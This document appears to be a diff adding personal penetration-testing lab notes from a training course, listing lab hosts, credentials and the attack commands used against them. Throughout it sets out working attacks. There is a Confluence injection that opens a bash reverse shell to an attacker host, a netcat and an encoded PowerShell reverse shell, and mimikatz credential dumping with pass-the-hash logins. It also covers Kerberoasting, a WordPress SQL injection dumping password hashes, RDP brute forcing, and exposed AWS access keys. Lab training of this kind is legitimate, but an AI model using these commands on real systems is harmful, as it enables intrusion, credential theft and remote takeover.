@@ -1,0 +1,1274 @@
+192.168.148.202
+
+The Metasploit Framework - Auxiliary Modules - VM #2 OS Credentials:
+
+No credentials were provided for this machine
+
+192.168.148.201
+
+The Metasploit Framework - Auxiliary Modules - VM #1 OS Credentials:
+
+db_nmap -A 192.168.148.202
+
+
+
+
+
+192.168.148.223
+
+The Metasploit Framework - Core Meterpreter Post-Exploitation Features - VM #1 OS Credentials:
+
+msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.45.186 LPORT=443 -f exe -o met.exe
+
+iwr -uri http://192.168.45.186/met.exe -Outfile met.exe
+
+
+
+192.168.148.225
+
+The Metasploit Framework - Capstone Exercise - VM #1 OS Credentials:
+
+No credentials were provided for this machine
+
+192.168.148.226
+
+The Metasploit Framework - Capstone Exercise - VM #2 OS Credentials:
+
+
+
+
+msf6 exploit(multi/http/apache_nifi_processor_rce) > show options
+
+Module options (exploit/multi/http/apache_nifi_processor_rce):
+
+   Name          Current Setting  Required  Description
+   ----          ---------------  --------  -----------
+   BEARER-TOKEN                   no        JWT authenticate with
+   DELAY         5                yes       The delay (s) before stopping and deleting the processor
+   PASSWORD                       no        Password to authenticate with
+   Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS        192.168.133.225  yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT         8080             yes       The target port (TCP)
+   TARGETURI     /                yes       The base path
+   USERNAME                       no        Username to authenticate with
+   VHOST                          no        HTTP server virtual host
+
+
+Payload options (cmd/windows/powershell/x64/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     192.168.45.194   yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   1   Windows (In-Memory)
+
+add also set SSL false and set ForceExploit true , the rest looks good
+
+getsystem
+
+load kiwi
+
+creds_all
+
+Username     Domain  NTLM                              SHA1
+--------     ------  ----                              ----
+alex         ITWK03  5391f1724568f48a4aadba748109864c  3c0c8334c4b5a80345d40e00550539a7c847809c
+itwk04admin  ITWK03  445414c16b5689513d4ad8234391aacf  3b25183b0c39fd03069f586c7d238160f54b6cd7
+offsec       ITWK03  b26462f877427f4f6a87605d587ac60d  f237f7e3b1958e6047f1b29716a2f776dbdb5a19
+
+impacket-psexec 'alex:5391f1724568f48a4aadba748109864c'@192.168.148.226
+impacket-psexec 'itwk04admin:445414c16b5689513d4ad8234391aacf'@192.168.148.226
+impacket-psexec 'offsec:b26462f877427f4f6a87605d587ac60d'@192.168.148.226
+impacket-psexec -hashes :445414c16b5689513d4ad8234391aacf ITWK03/itwk04admin@192.168.148.226
+
+
+
+
+
+
+
+
+192.168.152.63  CONFLUENCE01  
+172.16.152.217  HRSHARES  
+10.4.152.215    PGDATABASE01
+
+Create an SSH local port forward on CONFLUENCE01
+kali machine against the server on HRSHARES 
+
+    Enable Python's pty module after getting a shell on Confluence.
+    Set up port forwarding as in listing 21, changing the port to 4242 and IP.
+    Download ssh_local_client via browser.
+    Use the -h argument for help if issues arise with the binary.
+
+nc -lvnp 4444
+curl http://192.168.152.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.186/4444%200%3E%261%27%29.start%28%29%22%29%7D/
+
+python3 -c 'import pty; pty.spawn("/bin/sh")'
+
+ssh database_admin@10.4.152.215
+
+sqlpass123
+   P@ssw0rd!
+   Welcome1234
+
+confluence
+ssh -N -L 0.0.0.0:4455:172.16.152.217:4242 database_admin@10.4.152.215
+
+kali
+smbclient -p 4455 -L //192.168.50.63/ -U hr_admin --password=Welcome1234
+
+./ssh_local_client -i 192.168.152.63 -p 4455
+
+
+
+
+
+
+
+10.4.152.215   PGDATABASE01 
+192.168.152.63 CONFLUENCE01
+
+    Configure the remote port forward as instructed in this learning unit.
+    Refer to listing 31, modify the port to 4444, and adjust the IP address.
+    Download the ssh_remote_client via browser.
+
+sudo systemctl start ssh
+sudo ss -ntplu
+
+confluence
+python3 -c 'import pty; pty.spawn("/bin/sh")'
+ssh -N -R 127.0.0.1:4444:10.4.152.215:4444 kali@192.168.45.186
+
+
+kali
+
+./ssh_remote_client -i 127.0.0.1 -p 4444
+
+psql -h 127.0.0.1 -p 2345 -U postgres
+\l
+
+
+
+
+
+192.168.152.64 MULTISERVER03 
+10.4.152.215 PGDATABASE01 
+
+Log in to MULTISERVER03 with the rdp_admin credentials we found in the Confluence database
+   rdp_admin:P@ssw0rd!
+
+use the Windows OpenSSH client to create a port forward that allows you to reach port 4141 on PGDATABASE01 from your Kali machine.
+
+    Configure the port forward as shown in this learning unit.
+    Download the ssh_exe_exercise_client.bin via browser.
+    Make the binary executable and run it through proxychains against 4141 on PGDATABASE01 to reveal the flag.
+
+xfreerdp3 /u:rdp_admin /p:'P@ssw0rd!' /v:192.168.152.64
+ssh -N -R 9998 kali@192.168.45.186
+
+kali
+proxychains ./ssh_exe_exercise_client -i 10.4.152.215 -p 4141
+proxychains psql -h 10.4.50.215 -U postgres
+
+iwr -uri http://192.168.45.186/ssh_exe_exercise_client -Outfile ssh_exe_exercise_client
+
+
+
+
+
+
+
+192.168.152.64 MULTISERVER03
+http://192.168.152.64/umbraco/forms.aspx
+powershell wget -Uri http://192.168.45.186/nc.exe -OutFile C:\Windows\Temp\nc.exe
+nc -nvlp 4446
+C:\Windows\Temp\nc.exe -e cmd.exe 192.168.45.186 4446
+// from shell
+powershell wget -Uri http://192.168.45.186/plink.exe -OutFile C:\Windows\Temp\plink.exe
+C:\Windows\Temp\plink.exe -ssh -l kali -pw kali -R 127.0.0.1:9833:127.0.0.1:3389 192.168.45.186
+
+xfreerdp /u:rdp_admin /p:'P@ssw0rd!' /v:127.0.0.1:9833
+
+cmd.exe /c echo y | .\plink.exe -ssh -l kali -pw kali -R 127.0.0.1:9833:127.0.0.1:3389 192.168.45.186
+
+
+.\plink.exe -ssh -l kali -pw kali -R 127.0.0.1:9833:127.0.0.1:3389 192.168.45.186
+
+
+wget -Uri http://192.168.45.186/PrintSpoofer64.exe -OutFile C:\Windows\Temp\ps64.exe
+
+
+
+
+
+192.168.152.64 MULTISERVER03 
+10.4.152.215 PGDATABASE01
+
+xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:192.168.152.64
+
+netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.152.64 connectport=22 connectaddress=10.4.152.215
+netstat -anp TCP | find "2222"
+netsh interface portproxy show all
+
+netsh advfirewall firewall add rule name="port_forward_ssh_2222" protocol=TCP dir=in localip=192.168.152.64 localport=2222 action=allow
+
+
+sudo nmap -sS 192.168.50.64 -Pn -n -p2222
+
+ssh database_admin@192.168.152.64 -p2222
+
+
+
+
+netsh interface portproxy del v4tov4 listenport=2222 listenaddress=192.168.152.64
+
+
+192.168.152.64 MULTISERVER03
+10.4.152.215 PGDATABASE01
+
+Create a port forward on MULTISERVER03 that allows you to run this binary against port 4545 on PGDATABASE01
+
+    Repeat the steps in this learning unit.
+    Use the command in listing 61, and change the port to 4545 and the IP.
+    Download the netsh_exercise_client.bin.
+    Make the binary executable and run it against 4545 on MULTISERVER03 to get the flag.
+
+xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:192.168.152.64
+
+netsh interface portproxy add v4tov4 listenport=4545 listenaddress=192.168.152.64 connectport=4545 connectaddress=10.4.152.215
+netsh advfirewall firewall add rule name="port_forward_ssh_4545" protocol=TCP dir=in localip=192.168.152.64 localport=4545 action=allow
+
+./netsh_exercise_client database_admin@192.168.152.64 -p4545
+
+netsh advfirewall firewall delete rule name="port_forward_ssh_4545"
+
+
+-------------------------------------------------------------------------------------------------------------------------------------
+10.4.152.215 PGDATABASE01 
+192.168.152.63 CONFLUENCE01 
+
+There's a server running on port 8008 on PGDATABASE01. Set up a port forward using Chisel that allows you to run the binary you downloaded against port 8008 on PGDATABASE01
+
+./chisel server -p 8080 --reverse
+
+curl http://192.168.152.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager().getEngineByName("nashorn").eval("new%20java.lang.ProcessBuilder().command('bash'%2C'-c'%2C'wget%20192.168.45.186/chisel2%20-O%20/tmp/chisel2').start()")%7D/
+
+curl http://192.168.152.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager().getEngineByName("nashorn").eval("new%20java.lang.ProcessBuilder().command('bash'%2C'-c'%2C'chmod%20%2Bx%20/tmp/chisel2').start()")%7D/
+
+curl http://192.168.152.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager().getEngineByName("nashorn").eval("new%20java.lang.ProcessBuilder().command('bash'%2C'-c'%2C'/tmp/chisel2%20client%20192.168.45.186:8080%20R:socks').start()")%7D/ 
+
+
+- Kali: ./chisel server -p 9999 --reverse
+- Target: chisel client {KALI IP}:9999 R:8000:127.0.0.1:8000
+Then to access, use 127.0.0.1 and whatever port assigned
+-------------------------------------------------------------------------------------------------------------------------------------
+
+
+192.168.152.64 MULTISERVER03 
+
+192.168.152.7 FELINEAUTHORITY
+kali / 7he_C4t_c0ntro11er
+
+10.4.152.215  PGDATABASE01
+database_admin / sqlpass123
+
+192.168.152.63 CONFLUENCE01
+
+ssh database_admin@10.4.152.215
+ssh kali@192.168.152.7
+
+
+
+
+
+
+
+
+
+192.168.152.75 stephanie
+xfreerdp3 /u:stephanie /d:corp.com /v:192.168.152.75
+LegmanTeamBenzoin!!
+
+function LDAPSearch {
+    param (
+        [string]$LDAPQuery
+    )
+
+    $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
+    $DistinguishedName = ([adsi]'').distinguishedName
+
+    $DirectoryEntry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$PDC/$DistinguishedName")
+
+    $DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher($DirectoryEntry, $LDAPQuery)
+
+    return $DirectorySearcher.FindAll()
+
+}
+
+$group = LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=Service Personnel*))"
+
+function LDAPSearch {
+    param (
+        [string]$LDAPQuery
+    )
+
+    $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
+    $DistinguishedName = ([adsi]'').distinguishedName
+    $DirectoryEntry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$PDC/$DistinguishedName")
+    $DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher($DirectoryEntry, $LDAPQuery)
+    return $DirectorySearcher.FindAll()
+}
+
+function Get-NestedMembers {
+    param (
+        [string[]]$DNs
+    )
+
+    $finalUsers = @()
+
+    foreach ($dn in $DNs) {
+        $entry = [ADSI]"LDAP://$dn"
+        if ($entry.objectClass -contains "group") {
+            try {
+                $subMembers = $entry.member
+                $finalUsers += Get-NestedMembers -DNs $subMembers
+            } catch {}
+        }
+        elseif ($entry.objectClass -contains "user") {
+            $finalUsers += $entry
+        }
+    }
+
+    return $finalUsers
+}
+
+# Start from "Service Personnel"
+$groupName = "Service Personnel"
+$results = LDAPSearch "(&(objectClass=group)(cn=$groupName))"
+
+# Grab members
+$members = @()
+foreach ($result in $results) {
+    $members += $result.Properties["member"]
+}
+
+# Resolve users
+$allUsers = Get-NestedMembers -DNs $members
+
+# Dump to file
+$outputPath = "C:\Users\Public\output.txt"
+"=== Dump of user attributes ===`n" | Out-File $outputPath
+
+foreach ($user in $allUsers) {
+    "User: $($user.distinguishedName)" | Add-Content $outputPath
+    $props = $user.psbase.Properties
+    foreach ($propName in $props.PropertyNames) {
+        $value = $props[$propName] -join ", "
+        "$propName : $value" | Add-Content $outputPath
+    }
+    "`n" | Add-Content $outputPath
+}
+
+
+
+
+
+192.168.152.70  dc1 OS Credentials:
+
+192.168.152.75 client75 OS Credentials:
+
+impacket-GetNPUsers -dc-ip 192.168.152.70  -request -outputfile hashes.asreproast corp.com/pete
+Nexus123!
+
+
+sudo impacket-GetUserSPNs -request -dc-ip 192.168.152.70 corp.com/jeff
+HenchmanPutridBonbon11
+sudo hashcat -m 13100 hashes.kerberoast2 /usr/share/wordlists/rockyou.txt -r append1.rule --force
+
+
+---------------------------------------------------------------------------------------------------
+
+172.16.108.240  VM #1 OS Credentials:
+
+192.168.152.250 VM #6 - WINPREP OS Credentials:
+offsec / lab
+
+192.168.152.244  VM #5 - WEBSRV1 OS Credentials:
+
+172.16.108.243 VM #4 OS Credentials:
+
+192.168.152.242 VM #3 - MAILSRV1 OS Credentials:
+
+172.16.108.241 VM #2 OS Credentials:
+
+searchsploit -x 50420
+
+python3 50420.py http://192.168.152.244 /home/daniela/.ssh/id_rsa
+
+ssh -i id_rsa daniela@192.168.152.244
+tequieromucho
+
+sudo git -p help config
+!/bin/bash
+
+   -#!/bin/bash
+   -
+   -# Script to obtain the current state of the web app from the staging server
+   -
+   -sshpass -p "dqsTwTpZPn#nL" rsync john@192.168.50.245:/current_webapp/ /srv/www/wordpress/
+   -
+--------------------------------------------------------------------------------------------------------------
+
+
+
+192.168.152.70  dc1 OS Credentials:
+
+
+192.168.152.75 client75 OS Credentials:
+
+
+192.168.152.72  web04
+
+xfreerdp3 /u:jeff /v:192.168.152.75 /p:HenchmanPutridBonbon11
+
+
+
+
+
+
+100.27.22.152
+
+offseclab.io
+
+Attacker Access Key Id  AKIA6QPQS5UBXYQYS5S2
+
+Attacker Access Key Secret  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
+
+account id 997473840387
+
+aws --profile attacker ec2 describe-snapshots \
+  --owner-ids 997473840387 \
+  --query 'Snapshots[?VolumeSize==`1`].[SnapshotId,Description,VolumeSize]' \
+  --output table
+
+
+
+
+  {
+    "Version": "2012-10-17",
+    "Statement": [
+        {
+            "Sid": "AllowUserToListBucket",
+            "Effect": "Allow",
+            "Resource": "arn:aws:s3:::offseclab-dummy-bucket-29706-10639-26739",
+            "Principal": {
+                "AWS": ["arn:aws:iam::123456789012:user/cloudadmin"]
+            },
+            "Action": "s3:ListBucket"
+
+        }
+    ]
+}
+Console url: https://195275632424.signin.aws.amazon.com/console
+pass: #hwjNO#@TzD{z1kQBpQ)
+user: monitoring
+target access key id: AKIAS252VV4UELY7V5UK
+target secret: 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
+challenge access key id: AKIAS252VV4UHUOHQSW6
+challenge secret: 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
+
+aws --profile target sts get-caller-identity
+{
+    "UserId": "AIDAS252VV4UDBNPQC6PN",
+    "Account": "195275632424",
+    "Arn": "arn:aws:iam::195275632424:user/support/clouddesk-plove"
+}
+aws --profile challenge  sts get-caller-identity                                                                   
+{
+    "UserId": "AIDAS252VV4UPYILAQ73H",
+    "Account": "195275632424",
+    "Arn": "arn:aws:iam::195275632424:user/challenge"
+}
+aws --profile challenge lambda invoke --function-name arn:aws:lambda:us-east-1:195275632424:function:nonexistent-function outfile
+arn:aws:iam::195275632424:user/challenge
+aws --profile challenge sts get-caller-identity --region us-east-2
+{
+    "UserId": "AIDAS252VV4UPYILAQ73H",
+    "Account": "195275632424",
+    "Arn": "arn:aws:iam::195275632424:user/challenge"
+}
+aws --profile challenge iam list-user-policies --user-name challenge
+aws --profile challenge iam list-attached-user-policies --user-name challenge
+aws --profile challenge iam list-groups-for-user --user-name clouddesk-plove
+aws iam simulate-principal-policy \
+  --profile challenge \
+  --policy-source-arn arn:aws:iam::195275632424:user/challenge \
+  --action-names ec2:Describe* ec2:List* \
+  --region us-east-1
+
+aws --profile challenge sts get-access-key-info --access-key-id AKIAS252VV4UHUOHQSW6
+{
+    "Account": "195275632424"
+}
+
+// this found the proof
+aws ec2 describe-vpcs --profile challenge --region us-east-1 \
+  --query 'Vpcs[*].Tags' --output table
+
+aws --profile challenge iam get-account-authorization-details --filter User Group LocalManagedPolicy Role | tee account-authorization-details.json
+
+aws iam list-users --profile target --region us-east-1
+{
+    "Users": [
+        {
+            "Path": "/admin/",
+            "UserName": "admin-alice",
+            "UserId": "AIDAS252VV4UO3WXEQ5H2",
+            "Arn": "arn:aws:iam::195275632424:user/admin/admin-alice",
+            "CreateDate": "2025-07-06T18:28:42+00:00"
+        },
+        {
+            "Path": "/amethyst/",
+            "UserName": "admin-cbarton",
+            "UserId": "AIDAS252VV4UJZGGD6TJZ",
+            "Arn": "arn:aws:iam::195275632424:user/amethyst/admin-cbarton",
+            "CreateDate": "2025-07-06T18:28:42+00:00"
+        },
+        {
+            "Path": "/sapphire/",
+            "UserName": "admin-srogers",
+            "UserId": "AIDAS252VV4UDC3L7AAY2",
+            "Arn": "arn:aws:iam::195275632424:user/sapphire/admin-srogers",
+            "CreateDate": "2025-07-06T18:28:42+00:00"
+        },
+        {
+            "Path": "/ruby/",
+            "UserName": "admin-tstark",
+            "UserId": "AIDAS252VV4UBTC5LTDMB",
+            "Arn": "arn:aws:iam::195275632424:user/ruby/admin-tstark",
+            "CreateDate": "2025-07-06T18:28:42+00:00"
+        },
+        {
+            "Path": "/",
+            "UserName": "challenge",
+            "UserId": "AIDAS252VV4UPYILAQ73H",
+            "Arn": "arn:aws:iam::195275632424:user/challenge",
+            "CreateDate": "2025-07-06T18:28:42+00:00"
+        },
+        {
+            "Path": "/support/",
+            "UserName": "clouddesk-bob",
+            "UserId": "AIDAS252VV4UN3OOANWFO",
+            "Arn": "arn:aws:iam::195275632424:user/support/clouddesk-bob",
+            "CreateDate": "2025-07-06T18:28:42+00:00"
+        },
+        {
+            "Path": "/support/",
+            "UserName": "clouddesk-fruiz",
+            "UserId": "AIDAS252VV4UN2FZ4WSB3",
+            "Arn": "arn:aws:iam::195275632424:user/support/clouddesk-fruiz",
+            "CreateDate": "2025-07-06T18:28:42+00:00"
+        },
+        {
+            "Path": "/support/",
+            "UserName": "clouddesk-plove",
+            "UserId": "AIDAS252VV4UDBNPQC6PN",
+            "Arn": "arn:aws:iam::195275632424:user/support/clouddesk-plove",
+            "CreateDate": "2025-07-06T18:28:42+00:00"
+        },
+        {
+            "Path": "/ruby/",
+            "UserName": "dev-ballen",
+            "UserId": "AIDAS252VV4UOEULCHPQS",
+            "Arn": "arn:aws:iam::195275632424:user/ruby/dev-ballen",
+            "CreateDate": "2025-07-06T18:28:42+00:00"
+        },
+        {
+            "Path": "/ruby/",
+            "UserName": "dev-csandiego",
+            "UserId": "AIDAS252VV4UAKCZQWZTJ",
+            "Arn": "arn:aws:iam::195275632424:user/ruby/dev-csandiego",
+            "CreateDate": "2025-07-06T18:28:42+00:00"
+        },
+        {
+            "Path": "/sapphire/",
+            "UserName": "dev-ddory",
+            "UserId": "AIDAS252VV4ULOCHFFY7A",
+            "Arn": "arn:aws:iam::195275632424:user/sapphire/dev-ddory",
+            "CreateDate": "2025-07-06T18:28:42+00:00"
+        },
+        {
+            "Path": "/sapphire/",
+            "UserName": "dev-jreyes",
+            "UserId": "AIDAS252VV4UCKLMHTBXO",
+            "Arn": "arn:aws:iam::195275632424:user/sapphire/dev-jreyes",
+            "CreateDate": "2025-07-06T18:28:42+00:00"
+        },
+        {
+            "Path": "/ruby/",
+            "UserName": "dev-mmurdock",
+            "UserId": "AIDAS252VV4UOCUNB542N",
+            "Arn": "arn:aws:iam::195275632424:user/ruby/dev-mmurdock",
+            "CreateDate": "2025-07-06T18:28:42+00:00"
+        },
+        {
+            "Path": "/amethyst/",
+            "UserName": "dev-mwindu",
+            "UserId": "AIDAS252VV4UO7ILZRXTM",
+            "Arn": "arn:aws:iam::195275632424:user/amethyst/dev-mwindu",
+            "CreateDate": "2025-07-06T18:28:42+00:00"
+        },
+        {
+            "Path": "/amethyst/",
+            "UserName": "dev-prince",
+            "UserId": "AIDAS252VV4UF77JPSYTK",
+            "Arn": "arn:aws:iam::195275632424:user/amethyst/dev-prince",
+            "CreateDate": "2025-07-06T18:28:42+00:00"
+        },
+        {
+            "Path": "/amethyst/",
+            "UserName": "dev-rboggs",
+            "UserId": "AIDAS252VV4UGIYUO6Y2U",
+            "Arn": "arn:aws:iam::195275632424:user/amethyst/dev-rboggs",
+            "CreateDate": "2025-07-06T18:28:42+00:00"
+        },
+        {
+            "Path": "/sapphire/",
+            "UserName": "dev-shedgehog",
+            "UserId": "AIDAS252VV4ULARUVXZ4G",
+            "Arn": "arn:aws:iam::195275632424:user/sapphire/dev-shedgehog",
+            "CreateDate": "2025-07-06T18:28:42+00:00"
+        },
+        {
+            "Path": "/",
+            "UserName": "monitoring",
+            "UserId": "AIDAS252VV4UOLXZ72OMF",
+            "Arn": "arn:aws:iam::195275632424:user/monitoring",
+            "CreateDate": "2025-07-06T18:28:42+00:00",
+            "PasswordLastUsed": "2025-07-06T18:44:07+00:00"
+        }
+    ]
+}
+monitoring
+    dev-shedgehog
+dev-rboggs
+    dev-prince
+dev-mwindu
+    dev-mmurdock
+dev-jreyes
+    dev-ddory
+    dev-csandiego
+    dev-ballen
+clouddesk-plove
+    clouddesk-fruiz
+clouddesk-bob
+challenge
+admin-tstark
+    admin-srogers
+admin-cbarton
+admin-alice
+
+
+
+
+
+    Connect to VM #1 via RDP with the provided credentials.
+    Use the provided commands in listing 43 and mimikatz is located on C:\tools\ .
+    After you have obtained the NTLM hash, use the commands provided in listing 44 to connect your .212 machine.
+
+192.168.102.212 VM #2 OS Credentials:
+192.168.102.211 VM #1 OS Credentials:
+gunther / password123!
+
+xfreerdp3 /u:gunther /p:password123! /v:192.168.102.211
+privilege::debug
+token::elevate
+lsadump::sam
+
+smbclient \\\\192.168.102.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b
+impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.102.212
+
+nmap -sS -sV -O -A -Pn 192.168.102.210
+
+echo "\\\\192.168.45.194\\pwned" > trigger.txt
+used burpsuite, replace filename in post with the unc path
+
+DISISMYPASSWORD
+
+192.168.102.211  VM #1 OS Credentials:
+192.168.102.212 VM #2 (FILES02)
+
+impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.102.212 -c "powershell -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQA5ADIALgAxADYAOAAuADQANQAuADEAOQA0ACcALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAIgAuACAAewAgACQAZABhAHQAYQAgAH0AIAAyAD4AJgAxACIAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAgACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAJwBQAFMAIAAnACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAJwA+ACAAJwA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA="
+$client = New-Object System.Net.Sockets.TCPClient('192.168.45.194',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+
+nc -lvnp 8080
+
+nc 192.168.50.211 5555
+
+dir \\192.168.45.194\test
+
+
+
+
+
+192.168.102.212 VM #4 OS Credentials:
+192.168.102.202 VM #3 OS Credentials:
+
+    Start the ntlmrelayx server as shown in listing 52.
+    Access the Beta App and execute the dir command shown in listing 49.
+    Remember to use your assigned Kali IP address.
+
+dir \\192.168.45.194\test
+
+
+
+192.168.102.227
+nadine eSGJIzUp5nrr834QZBWK
+XOWV2yg3JVkYc5cOBYip
+pinkpanther1234  eSGJIzUp5nrr834QZBWK 12345   password
+xfreerdp3 /u:nadine /p:123abc /v:192.168.102.227
+hydra -t 4 -V -f -l nadine -P /usr/share/wordlists/rockyou.txt rdp://192.168.102.227
+hydra -l nadine -P /usr/share/wordlists/rockyou.txt rdp://192.168.214.227
+qwertyuiop123!
+123abc
+
+2835573fb334e3696ef62a00e5cf7571
+hashcat -m 1000 steve.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+
+
+
+
+192.168.102.47
+Visit the website and add alvida-eatery.org to your hosts file.
+nmap -sS -sV -O -A -Pn 192.168.102.47
+wpscan --url http://alvida-eatery.org/ --enumerate ap,u,t --api-token U0bsWiyylB42qROJQSnyNLaF8aYn2LsZQpnTphaw5P8 --no-update
+
+
+[+] perfect-survey
+ | Location: http://alvida-eatery.org/wp-content/plugins/perfect-survey/
+ | Latest Version: 1.5.1 (up to date)
+ | Last Updated: 2021-06-11T12:09:00.000Z
+ |
+ | Found By: Urls In Homepage (Passive Detection)
+ |
+ | [!] 4 vulnerabilities identified:
+ |
+ | [!] Title: Perfect Survey < 1.5.2 - Unauthorised AJAX Call to Stored XSS / Survey Settings Update
+ |     Fixed in: 1.5.2
+ |     References:
+ |      - https://wpscan.com/vulnerability/c73c7694-1cee-4f26-a425-9c336adce52b
+ |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-24763
+ |
+ | [!] Title: Perfect Survey < 1.5.2 - Unauthenticated SQL Injection
+ |     Fixed in: 1.5.2
+ |     References:
+ |      - https://wpscan.com/vulnerability/c1620905-7c31-4e62-80f5-1d9635be11ad
+ |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-24762
+ |
+ | [!] Title: Perfect Survey < 1.5.2 - Reflected Cross-Site Scripting
+ |     Fixed in: 1.5.2
+ |     References:
+ |      - https://wpscan.com/vulnerability/c2f8e9b9-c044-4c45-8d17-e628e9cb5d59
+ |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-24764
+ |
+ | [!] Title: Perfect Survey < 1.5.2 - Unauthenticated Stored Cross-Site Scripting
+ |     References:
+ |      - https://wpscan.com/vulnerability/4440e7ca-1a55-444d-8f6c-04153302d750
+ |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-24765
+ |
+ | Version: 1.5.1 (100% confidence)
+ | Found By: Readme - Stable Tag (Aggressive Detection)
+ |  - http://alvida-eatery.org/wp-content/plugins/perfect-survey/readme.txt
+ | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
+ |  - http://alvida-eatery.org/wp-content/plugins/perfect-survey/readme.txt
+
+[i] User(s) Identified:
+
+[+] admin
+
+http://alveda-eatery.org/wp-admin/admin-ajax.php?action=get_question&question_id=1 union select 1,1,char(116.101.120,116),user_login,user_pass,0,0,null,null,null,null,null,null,null,null,null from wp_users
+
+$P$BINTaLa8QLMqeXbQtzT2Qfizm29/nI0
+$P$BINTaLa8QLMqeXbQtzT2Qfizm2P/nI0
+john --format=phpass hashtocrack.txt --wordlist=/usr/share/wordlists/rockyou.txt
+
+joefeher..*7¡Vamos!
+
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-06 19:14 EDT
+Nmap scan report for alvida-eatery.org (192.168.102.47)
+Host is up (0.091s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 be:8e:6f:c7:16:99:d1:02:93:0c:18:c0:0e:f4:fb:2e (ECDSA)
+|_  256 37:1d:ad:05:2c:9d:e8:26:94:59:81:b8:46:b3:45:09 (ED25519)
+80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
+|_http-generator: WordPress 6.0
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+|_http-title: Alvida Eatery
+Device type: general purpose|router
+Running: Linux 5.X, MikroTik RouterOS 7.X
